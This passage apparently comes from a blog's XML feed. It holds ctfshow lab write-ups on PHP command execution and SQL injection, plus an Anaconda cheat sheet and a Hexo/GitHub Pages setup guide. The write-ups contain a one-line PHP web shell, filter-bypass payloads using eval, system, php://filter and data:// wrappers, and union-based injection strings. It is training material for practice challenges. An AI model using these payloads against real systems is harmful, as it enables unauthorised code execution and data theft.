php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>web入门-命令执行</title>
    <link href="/2024/02/24/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2024/02/24/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1>29</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">..</span>./?<span class="hljs-attribute">c</span>=phpinfo();<br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">.../<span class="hljs-string">?c</span>=phpinfo()<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/29.1.jpg" class=""><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">.../?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br></code></pre></td></tr></table></figure><img src="/2024/02/24/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/29.2.jpg" class=""><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">.../?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cp fla?.php 1.txt&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.../1.txt</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/29.3.jpg" class=""><h1>30</h1><p><strong>题目</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(!preg_match(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>)</span></span>)<br></code></pre></td></tr></table></figure><p><strong>解法</strong></p><p>反引号相当于system命令执行</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">.../?c=`cp fla?.??? <span class="hljs-number">1</span>.txt`;<br></code></pre></td></tr></table></figure><h1>31使用跳板</h1><p><strong>题目</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>)</span></span>)<br></code></pre></td></tr></table></figure><p><strong>解法</strong></p><p>尝试：成功</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">..</span>./?<span class="hljs-attribute">c</span>=eval($_GET[1]);&amp;<span class="hljs-attribute">1</span>=phpinfo();<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">.../?c=<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p>执行后需要查看源代码</p><img src="/2024/02/24/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/32.1.jpg" class=""><h1>32</h1><p><strong>题目</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>)</span></span>)<br></code></pre></td></tr></table></figure><p><strong>解法</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span>%0a<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">1</span>=<span class="hljs-regexp">/etc/passwd</span><br></code></pre></td></tr></table></figure><p>文件包含成功，显示系统文件</p><p>使用文件包含的方法</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">.../<span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span>%0a<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">1</span>=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/convert</span>.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>然后base64解码</p><p>（使用了伪协议，通过指定方法读取某个资源）</p><h1>33</h1><p><strong>题目</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>)</span></span>)<br></code></pre></td></tr></table></figure><p><strong>解法</strong></p><ol><li><p>同32</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">.../<span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span>%0a<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">1</span>=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/convert</span>.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure></li><li><p>使用require</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">.../<span class="hljs-string">?c</span>=<span class="hljs-keyword">require</span>%0a<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">1</span>=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/convert</span>.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure></li></ol><h1>34</h1><p><strong>题目</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>)</span></span>)<br></code></pre></td></tr></table></figure><p><strong>解法</strong></p><p>不需要使用括号的语言结构：echo、print、isset、unset、include、require</p><p>解法同33，使用include</p><h1>35</h1><p><strong>题目</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="hljs-variable">$c</span>)</span></span>)<br></code></pre></td></tr></table></figure><p>include</p><h1>36</h1><p>过滤了数字，可以把1换成a，可能后期会由于版本升级而失效</p><h1>37</h1><p><strong>题目</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;  <br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];   <br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;     <br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);     <br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;     <br>&#125;     <br>&#125;<span class="hljs-keyword">else</span>&#123;   <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>考点</strong>：伪协议</p><p>1、尝试→成功</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">.../?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>2、payload</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">.../?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;mv fla?.php 1.txt&quot;</span>)<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">.../1.txt</span><br></code></pre></td></tr></table></figure><h1>38 使用短标签</h1><p><strong>题目</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;  <br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];   <br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|php|file|/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;     <br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);     <br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;     <br>&#125;     <br>&#125;<span class="hljs-keyword">else</span>&#123;   <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解法</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">.../<span class="hljs-string">?c</span>=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plain</span>,&lt;<span class="hljs-string">?=</span>system(<span class="hljs-string">&quot;cp fl*,*1.txt&quot;</span>);<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><h1>39</h1><p><strong>题目</strong></p><p>无回显，且强制加后缀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解法</strong></p><p>1、尝试</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">.../<span class="hljs-string">?c</span>=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plain</span>,&lt;<span class="hljs-string">?=</span>phpinfo();<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>2、payload</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">.../<span class="hljs-string">?c</span>=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plain</span>,&lt;<span class="hljs-string">?=</span>system(<span class="hljs-string">&quot;tac fla?.php&quot;</span>);<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><h1>40</h1><p><strong>题目</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p><strong>解法一</strong></p><p>（提示解法）</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">.../<span class="hljs-string">?c</span>=show_source(<span class="hljs-keyword">next</span>(array_reverse(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure><p>通过货币信息取点，扫描当前目录，把目录的结果进行翻转，取下一个，再显示源码</p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Anaconda</title>
    <link href="/2024/02/24/Anaconda/"/>
    <url>/2024/02/24/Anaconda/</url>
    
    <content type="html"><![CDATA[<h1>查看环境列表</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">conda <span class="hljs-built_in">env</span> list<br></code></pre></td></tr></table></figure><h1>创建环境</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">conda <span class="hljs-keyword">create</span> -n (<span class="hljs-type">name</span>) python=<span class="hljs-number">3.</span>x<br></code></pre></td></tr></table></figure><h1>删除环境</h1><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">conda remove -n (<span class="hljs-keyword">name</span>) --<span class="hljs-built_in">all</span><br></code></pre></td></tr></table></figure><h1>激活环境</h1><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">conda <span class="hljs-built_in">activate</span> xxx<br></code></pre></td></tr></table></figure><h1>退出当前环境</h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">conda deactivate</span><br></code></pre></td></tr></table></figure><h1>查看库</h1><p>查看当前环境安装了那些库</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">conda list</span><br></code></pre></td></tr></table></figure><h1>安装依赖库</h1><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> xxx 或 conda <span class="hljs-keyword">install</span> xxx <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Github+hexo搭建博客</title>
    <link href="/2024/02/24/Github+hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2024/02/24/Github+hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<p>本文记录了基于Github和hexo搭建博客的过程，以及在该过程中遇到的问题和解决方法</p><h1>工具准备</h1><ul><li><strong>Git</strong>：官网下载页面-<a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a></li><li><strong>NodeJS</strong>：官网下载页面-<a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a></li><li><strong>Github账号</strong>：账号申请-<a href="https://github.com/">https://github.com/</a></li></ul><h1>Github准备</h1><p>点击主页右上角的头像，点击“Your repositories”</p><img src="/2024/02/24/Github+hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/blog1.png" class=""><p>点击“new”，填写信息新建仓库（注意仓库名需与用户名一致），然后点击“Create repository”</p><img src="/2024/02/24/Github+hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/blog2.png" class=""><h1>Hexo搭建博客</h1><p>hexo官网：<a href="https://hexo.io/zh-cn/">Hexo</a></p><ol><li><p>在任意盘符新建文件夹用于存放博客目录，文件夹空白处右键，点击“Git Bash Here”</p><img src="/2024/02/24/Github+hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/blog9.png" class=""></li><li><p>在Git窗口中依次输入：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">npm install hexo-<span class="hljs-keyword">cli</span> -g<br></code></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">hexo <span class="hljs-keyword">init</span> blog<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> blog<br></code></pre></td></tr></table></figure><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">hexo <span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p>之后文件夹中会生成一个blog子文件夹：</p><img src="/2024/02/24/Github+hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/blog10.png" class=""><p><strong>一个小坑</strong>——npm命令报错：<code>npm ERR! request to https://registry.npm.taobao.org/cnpm failed, reason: certificate has expire</code>，解决方法为切换至淘宝新的镜像名：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">// 1. 清空缓存</span><br>npm cache clean --force<br><span class="hljs-comment">// 2. 切换新源</span><br>npm config set registry https:<span class="hljs-comment">//registry.npmmirror.com</span><br><span class="hljs-comment">// 3. 查看源是否设置成功</span><br>npm config get registry<br><span class="hljs-comment">// 4. 继续执行安装命令</span><br></code></pre></td></tr></table></figure></li><li><p>启动本地离线博客（本地测试）</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs verilog"># --<span class="hljs-keyword">generate</span> 部署之前预先生成静态文件<br>hexo g<br></code></pre></td></tr></table></figure><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo s</span><br></code></pre></td></tr></table></figure><p>接着按照提示在浏览器输入：<code>localhost:4000</code>，便可看到hexo的默认博客</p><img src="/2024/02/24/Github+hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/blog7.png" class=""></li></ol><h1>将Blog发布到Github上</h1><ol><li><p>在Git窗口中输入：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">git config <span class="hljs-attr">--global</span> user<span class="hljs-selector-class">.name</span> <span class="hljs-string">&quot;name&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">git config <span class="hljs-attr">--global</span> user<span class="hljs-selector-class">.email</span> <span class="hljs-string">&quot;email&quot;</span><br></code></pre></td></tr></table></figure><p>（刚开始时输入后面的语句报错，可能是name和email处的双引号问题，我后面就没有加上双引号）</p></li><li><p>创建ssh</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">ssh-keygen -<span class="hljs-built_in">t</span> rsa -C <span class="hljs-string">&quot;email&quot;</span><br></code></pre></td></tr></table></figure><p>一直回车</p><p>在用户/.ssh中会生成id_rsa.pub文件</p><img src="/2024/02/24/Github+hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/blog8.png" class=""></li><li><p>回到GitHub，Setting → SSH keys，把 id_rsa.pub 里面的内容全部复制到 key ，title可任意填写</p><img src="/2024/02/24/Github+hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/blog11.png" class=""></li><li><p>修改配置文件</p><p>在 blog文件夹下面找到 _config.yml，文档末尾修改（username为Github用户名）：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">deploy:</span><br><span class="hljs-symbol">  type:</span> git<br><span class="hljs-symbol">  repo:</span> https:<span class="hljs-comment">//github.com/username/username.github.io.git</span><br><span class="hljs-symbol">  branch:</span> master<br></code></pre></td></tr></table></figure><img src="/2024/02/24/Github+hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/blog12.png" class=""><p>修改url为：<code>https://username.github.io</code></p><img src="/2024/02/24/Github+hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/blog13.png" class=""></li><li><p>部署到Github上</p><p>安装git部署命令工具：<code>npm install hexo-deployer-git --save</code></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean</span><br></code></pre></td></tr></table></figure><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo g</span><br></code></pre></td></tr></table></figure><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo d</span><br></code></pre></td></tr></table></figure><p>（本地测试只需 <code>hexo g</code>+<code>hexo s</code>）</p><p>接着便可以通过<code>https://username.github.io</code>访问博客</p></li></ol><h1>Fluid主题</h1><p><strong>安装</strong>：fluid官网有详细配置步骤：<a href="https://github.com/fluid-dev/hexo-theme-fluid?tab=readme-ov-file">fluid-dev/hexo-theme-fluid: :ocean: 一款 Material Design 风格的 Hexo 主题 / An elegant Material-Design theme for Hexo (github.com)</a>，本文采用方法二</p><p><strong>个性化设置</strong>：</p><ol><li><p>浏览器标题</p><p>修改根目录下 <code>_config.yml</code> 中的 <code>title</code> 字段</p></li><li><p>博客标题</p><p>修改主题目录 <code>themes\fluid</code> 下 <code>_config.yml</code> 中的 <code>blog_title</code> 、<code>text</code>字段</p></li></ol><h1>注意</h1><p><strong>更换主题</strong></p><p>若更换主题后多次尝试但并未生效，可以尝试通过 <code>hexo clean</code> 来清除缓存文件 (db.json) 和已生成的静态文件 (public)</p>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>web入门-sql注入</title>
    <link href="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/"/>
    <url>/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/</url>
    
    <content type="html"><![CDATA[<h1>171</h1><h2 id="题目">题目</h2><p><code>使用sqlmap是没有灵魂的</code></p><p>查询语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br></code></pre></td></tr></table></figure><h2 id="解法1">解法1</h2><p>payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">-<span class="hljs-number">1</span>&#x27; or id = &#x27;<span class="hljs-number">26</span><br></code></pre></td></tr></table></figure><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/1.1.jpg" class=""><h2 id="解法2">解法2</h2><ol><li><p>获取数据库名</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database() --+ <br></code></pre></td></tr></table></figure><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/1.2.jpg" class=""></li><li><p>获取表名</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">-1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;ctfshow_user&#x27;</span> --+ <br></code></pre></td></tr></table></figure><img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/1.3.jpg" class=""></li><li><p>得到flag</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">-1</span>&#x27; union select <span class="hljs-built_in">id</span>,username,password <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-comment">--+ </span><br></code></pre></td></tr></table></figure><img 